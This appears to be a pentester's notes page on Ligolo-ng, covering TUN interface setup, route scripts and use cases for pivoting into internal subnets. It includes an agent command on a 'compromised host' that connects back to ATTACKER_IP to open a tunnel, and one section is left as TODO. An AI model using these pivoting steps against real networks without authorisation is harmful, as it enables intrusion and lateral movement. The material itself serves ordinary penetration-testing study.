---
description: >-
  An advanced, yet simple, tunneling tool that uses a TUN interface. Ligolo-ng
  is a simple, lightweight and fast tool that allows pentesters to establish
  tunnels from a reverse TCP/TLS connection using
---

# Ligolo-Ng

{% embed url="https://github.com/tnpitsecurity/ligolo-ng" %}

<figure><img src="../../.gitbook/assets/Untitled Diagram (4).jpg" alt=""><figcaption></figcaption></figure>

### Setting up Ligolo-ng

{% hint style="info" %}
Before running Ligolo-ng, you must create a TUN Interface on the attacker PC so that ligolo can add routes to different sub networks. The idea is that when you have a sub network such as \`192.168.0.0/24\` that is inside the tartget network, you can provide the sub network IP address (which can only be reached from an internal network) to any tool you want.
{% endhint %}

`Creating a Tun Interface`

```
# Before running ligolo-ng proxy, you must create a tuntap virtual interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

<details>

<summary>ligolo-setup-script</summary>

```
#!/bin/bash
me="$(whoami)"
echo "addling ligolo routes to user: $user"

echo "creating the ligolo tun interface"
sudo ip tuntap add user "$me" mode tun ligolo 
sudo ip link set ligolo up

echo "now adding routes $a $b"
a="172.16.0.0/24"
b="192.168.0.0/24"
c="10.10.0.0/24"
sudo ip route add "$a" dev ligolo
echo "done : $a"
sudo ip route add "$b" dev ligolo
echo "done : $b"
sudo ip route add "$c" dev ligolo
echo "done : $c"

echo "fuck off now! :)"
```

</details>

Once you have added the TUN Interface and the sub networks that you want to access from the attacker PC, you can now launch ligolo proxy on the attacker PC and the agent on an already compromised host in the internal network.&#x20;

`Connecting to a Ligolo-Agent`

```
# 1. On the attacking machine :
./proxy -selfcert -laddr 0.0.0.0:9901

# 2. On each compromised host with the network that you want to pivot to
./agent -connect ATTACKER_IP:9901
```

### Agent Binding/Listening

`Agent Binding/listening on ligolo allows you to capture reverse shells from an internal network and forward it through the ligolo connection. You can then launch a netcat/pwncat-cs from the attacking machine seamlessly, give you the impression as if you were already in the target network.`

```
# 1. On the attacking machine :
TODO :)
```

### Use Cases&#x20;

### 1. Accessing the Target Network

Once you have gained access to the Public Facing Server that is in the Target Network, you can to access/enumerate or exploit any vulnerabilities against a different target in the same network using the very own tools from the attacking machine.

```
# 1. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs

# 2. Initiate a connection from the ligolo agent to the ligolo proxy
./agent -connect ATTACKER_IP:9901

# 1. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
sudo ip route add 192.168.0.0/24 dev ligolo

# 2. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)

# 3. Once selected, type : 
Start

//This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel.
```
![image](https://user-images.githubusercontent.com/90450439/221322376-4f8ff91f-54c9-4cef-8e52-2d824340b089.png)
